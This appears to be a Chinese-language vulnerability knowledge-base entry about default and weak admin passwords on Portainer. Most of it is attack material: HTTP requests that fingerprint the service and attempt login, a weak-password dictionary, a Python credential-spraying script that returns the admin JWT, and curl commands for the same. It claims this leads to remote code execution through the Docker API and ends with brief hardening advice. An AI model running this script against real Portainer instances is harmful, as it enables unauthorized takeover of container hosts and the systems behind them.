---
id: PORTAINER-DEFAULT-CREDS
title: "Portainer - 默认凭据与弱口令"
product: portainer
vendor: Portainer
version_affected: "all versions"
severity: CRITICAL
tags: [默认凭据, 弱口令, 认证突破, credential_spraying]
fingerprint: ["Portainer"]
---

## 漏洞描述

Portainer使用JWT Token认证机制，登录端点为 `/api/auth`。首次安装时管理员密码由用户设定，但大量实例使用默认弱口令（如 `admin/admin`、`admin/portainer`、`admin/password` 等）。攻击者可通过凭据喷洒快速获取管理员权限，进而利用Docker API实现RCE。

## 影响版本

- Portainer 全版本（配置弱口令的实例）

## 前置条件

- Portainer实例可达（默认端口9000/9443）
- 实例使用弱口令

## 利用步骤

### 1. 确认Portainer实例

```http
GET /api/status HTTP/1.1
Host: <target>:9000
```

返回200及JSON数据即为Portainer实例。

### 2. 尝试登录认证

```http
POST /api/auth HTTP/1.1
Host: <target>:9000
Content-Type: application/json

{"Username": "admin", "Password": "admin"}
```

成功返回: `{"jwt":"<token>"}`，失败返回401。

### 3. 常用弱口令字典

| 用户名 | 密码 |
|--------|------|
| admin | admin |
| admin | portainer |
| admin | password |
| admin | 123456 |
| admin | admin123 |
| admin | Portainer123 |

## Payload

```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_portainer(target):
    """检测Portainer存活与默认凭据"""
    target = target.rstrip('/')
    headers = {"Content-Type": "application/json"}

    # 1. 存活检测
    try:
        r = requests.get(f"{target}/api/status", timeout=10, verify=False)
        if r.status_code == 200:
            print(f"[+] {target} 是Portainer实例")
        else:
            print(f"[-] {target} 可能不是Portainer")
            return None
    except Exception as e:
        print(f"[-] 连接失败: {e}")
        return None

    # 2. 尝试常见密码
    passwords = ["admin", "portainer", "password", "123456", "admin123", "Portainer123"]
    for password in passwords:
        try:
            r = requests.post(f"{target}/api/auth",
                            json={"Username": "admin", "Password": password},
                            headers=headers, timeout=10, verify=False)
            if r.status_code == 200 and "jwt" in r.text:
                token = r.json()["jwt"]
                print(f"[+] 登录成功! admin/{password}")
                print(f"[+] JWT Token: {token[:50]}...")
                return token
        except:
            continue

    print(f"[-] 默认凭据尝试失败")
    return None

# 使用: check_portainer("http://target:9000")
```

## 验证方法

```bash
# 检测Portainer是否存活
curl -sk http://target:9000/api/status

# 尝试默认凭据
curl -sk -X POST http://target:9000/api/auth \
  -H "Content-Type: application/json" \
  -d '{"Username":"admin","Password":"admin"}'
# 返回含jwt字段即登录成功
```

## 修复建议

1. 首次部署时设置强密码（>= 12位，含大小写、数字、特殊字符）
2. 启用HTTPS（9443端口），禁用HTTP（9000端口）
3. 限制管理端口仅内网可访问
4. 启用Portainer内置的登录失败锁定机制
5. 对外暴露时前置反向代理并启用IP白名单
